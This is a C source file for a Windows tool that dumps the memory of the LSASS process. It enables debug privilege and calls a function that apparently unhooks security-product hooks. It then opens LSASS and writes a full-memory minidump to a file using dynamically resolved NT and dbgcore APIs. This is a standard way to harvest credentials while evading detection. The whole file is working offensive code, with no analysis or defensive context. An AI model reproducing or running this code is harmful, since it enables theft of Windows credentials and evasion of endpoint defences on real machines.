#include "Helper.h"

#pragma comment(lib, "dbghelp.lib")

int main() {

	if (!SetDebugPrivilege()) {
		return 1;
	}

	if (!UnhookFunction()) {
		return 2;
	}

	DWORD lsassPID = GetLsassPid();
	if (lsassPID == 0) {
		return 3;
	}

	HANDLE hProcess = NULL;
	hProcess = GetProcessHandle(lsassPID);

	if (!hProcess) {
		return 4;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return 5;
	}

	wchar_t dst[MAX_PATH] = L"\\??\\C:\\dev\\lsass.dmp";
	UNICODE_STRING uOutputFile;
	RtlInitUnicodeString(&uOutputFile, dst);

	HANDLE hDmpFile = NULL;
	IO_STATUS_BLOCK IoStatusBlock;
	OBJECT_ATTRIBUTES FileObjectAttributes;
	InitializeObjectAttributes(&FileObjectAttributes, &uOutputFile, 0x40, NULL, NULL);

	NtCreateFile(&hDmpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, 0x5, 0x20, NULL, 0);

	if (!hDmpFile) {
		return 6;
	}

	_MiniDumpWriteDump MyMiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(LoadLibraryA("dbgcore.dll"), "MiniDumpWriteDump");
	if (!MyMiniDumpWriteDump) { return 1; }

	BOOL success = MyMiniDumpWriteDump(hProcess,
	    lsassPID,
		hDmpFile,
		MiniDumpWithFullMemory,
		NULL,
		NULL,
		NULL);

	if (success) {
		return 0;
	}
	else {
		return 7;
	}

	CloseHandle(hDmpFile);
	CloseHandle(hProcess);

	return 0;
}